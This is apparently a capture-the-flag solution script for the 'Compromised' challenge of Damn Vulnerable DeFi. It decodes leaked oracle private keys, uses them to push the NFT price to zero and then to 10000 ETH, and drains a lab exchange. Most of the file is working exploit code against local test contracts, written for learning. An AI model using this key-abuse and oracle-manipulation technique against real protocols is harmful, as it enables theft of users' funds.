import { ethers } from "hardhat";
import { expect } from "chai";


describe('Compromised challenge', function () {
    this.timeout(0);
    
    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('10000');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
    
    before(async function () {
        /** SETUP SCENARIO */
        
        const accounts = await ethers.getSigners();
        const [deployer, attacker, ...otherAccounts] = accounts;

        // Fund the trusted source addresses
        for ( let source of sources) {
            await deployer.sendTransaction({ from: deployer.address, to: source, value: ethers.utils.parseEther('5') });
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        const oracleInitFactory = await ethers.getContractFactory("TrustfulOracleInitializer");
        const oraclelInitCont = await oracleInitFactory.connect(deployer).deploy(
            sources,
            ["DVNFT", "DVNFT", "DVNFT"],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
        );
        const oracleAddr = await oraclelInitCont.oracle();
        const oracleFactory = await ethers.getContractFactory("TrustfulOracle");
        this.oracle = await oracleFactory.connect(deployer).attach(oracleAddr);

        // Deploy the exchange and get the associated ERC721 token
        const exchangeFactory = await ethers.getContractFactory("Exchange");
        this.exchange = await exchangeFactory.connect(deployer).deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );

        const tokenAddr = await this.exchange.token();
        const tokenFactory = await ethers.getContractFactory("DamnValuableNFT");
        this.token = await tokenFactory.connect(deployer).attach(tokenAddr); 
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const accounts = await ethers.getSigners();
        const attacker = accounts[1];

        /*
         * This part of the challenge is like an easy web or reversing challenge,
         * I started with decoding the given hex arrays and see they are base64 strings.
         * Then, I decoded them and output strings look like private keys. Then I created wallets
         * using these keys and printed their addresses. It revealed that those are the keys of the 
         * 2 of 3 trusted oracle.   
         */

        let firstLine = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35".split(' ');
        let secondLine = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34".split(' ');
        let firstStr = "";
        for (let char of firstLine) {
            firstStr += String.fromCharCode(parseInt(char, 16));
        }

        let secondStr = "";
        for (let char of secondLine) {
            secondStr += String.fromCharCode(parseInt(char, 16));
        }

        let firstBuf = Buffer.from(firstStr, 'base64');
        let secondBuf = Buffer.from(secondStr, 'base64');
        console.log(firstBuf.toString());
        console.log(secondBuf.toString());

        let firstWallet = new ethers.Wallet(firstBuf.toString(), attacker.provider);
        let secondWallet = new ethers.Wallet(secondBuf.toString(), attacker.provider);

        console.log(firstWallet.address);
        console.log(secondWallet.address);

        /* 
         * I need to manipulate prices with two oracle to steal all ETH from the exchange.
         * I think the most staright way to achive this is buying a token really cheap and
         * Selling it with a huge price.
         */


        // buy a token for 0 eth.
        const TOKEN_SYMBOL = "DVNFT";
        let currentPrice = await this.oracle.connect(attacker).getMedianPrice(TOKEN_SYMBOL);
        console.log(currentPrice.toString());

        let tx = await this.oracle.connect(firstWallet).postPrice(TOKEN_SYMBOL, ethers.utils.parseUnits('0', 'wei'));
        await tx.wait();
        console.log(tx);

        tx = await this.oracle.connect(secondWallet).postPrice(TOKEN_SYMBOL, ethers.utils.parseUnits('0', 'wei'));
        await tx.wait();
        console.log(tx);

        currentPrice = await this.oracle.connect(attacker).getMedianPrice(TOKEN_SYMBOL);
        console.log(currentPrice.toString());

        expect(currentPrice).to.be.eq(0);

        // need to listen the event to get tokenid
        let tokenId = 0;
        this.exchange.on("TokenBought", (buyer:any, id:any, price:any, event:any) => {
            console.log("---- tokenId:" + id);
            tokenId = id;
        });

        tx = await this.exchange.connect(attacker).buyOne({ value: 1 });
        await tx.wait();
        console.log(tx);

        // a dirty trick to wait for TokenBought event.
        await new Promise(resolve => setTimeout(resolve, 5000));

        // sell the token for 10000 eth.
        tx = await this.oracle.connect(firstWallet).postPrice(TOKEN_SYMBOL, ethers.utils.parseEther('10000'));
        await tx.wait();
        console.log(tx);

        tx = await this.oracle.connect(secondWallet).postPrice(TOKEN_SYMBOL, ethers.utils.parseEther('10000'));
        await tx.wait();
        console.log(tx);

        currentPrice = await this.oracle.connect(attacker).getMedianPrice(TOKEN_SYMBOL);
        console.log(currentPrice.toString());

        expect(currentPrice).to.be.eq(ethers.utils.parseEther('10000')); 

        // need to approve
        tx = await this.token.connect(attacker).approve(this.exchange.address, tokenId);
        await tx.wait();
        console.log();

        tx = await this.exchange.connect(attacker).sellOne(tokenId);
        await tx.wait();
        console.log(tx);
        
    });

    after(async function () {
        const accounts = await ethers.getSigners();
        const attacker = accounts[1]; 

        /** SUCCESS CONDITION */
        expect(
            await attacker.provider!.getBalance(this.exchange.address)
        ).to.be.eq(0);

        expect(
            await attacker.provider!.getBalance(attacker.address)
        ).to.gt(ethers.utils.parseEther('10000'));
    });
});
